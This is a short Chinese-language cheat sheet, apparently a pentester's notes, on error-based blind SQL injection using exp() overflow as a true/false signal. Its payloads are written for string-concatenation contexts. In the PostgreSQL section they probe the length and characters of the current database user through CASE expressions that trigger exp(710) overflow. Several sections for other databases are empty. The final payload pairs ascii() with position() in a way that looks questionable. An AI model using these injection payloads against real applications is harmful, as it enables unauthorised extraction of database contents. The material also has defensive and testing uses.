# Common

## exp(x)

> 用于计算 e 的 x 次幂（即自然对数的指数）。当 x 超过一定的值时，结果会非常大，甚至超出数据库可以处理的范围，从而导致错误或异常。

```
'||exp(709)||'
在大多数数据库中，exp(709) 是能够计算的最大值之一。这条语句的执行不会导致异常，系统能够正常返回结果。
'||exp(710)||'
计算 exp(710) 会产生一个非常大的数字，通常超过了数据库能够表示的范围，从而导致溢出错误或异常（如数值超出范围或溢出错误）。
```

- MySQL：可能在处理 exp(710) 时返回错误。
- Oracle：可能抛出数值溢出异常。
- PostgreSQL：可能返回数值超出范围的错误。
- SQL Server：可能因为超出数值范围而引发异常。


# Mysql

```

```

# Mssql

```

```

# Oracle

```

```

# PostgreSQL

```
'||case length(user) when 1 then 1 else exp(710) end||'
position('sql' in 'postgresql')返回的是8
position('sq' in 'postgresql')返回的也是8
position('p' in 'postgresql')返回的则是1
'||case ascii(position('a' in user)) when 1 then 1 else exp(710) end||'
```

# Refences

- https://forum.butian.net/share/3648
- 
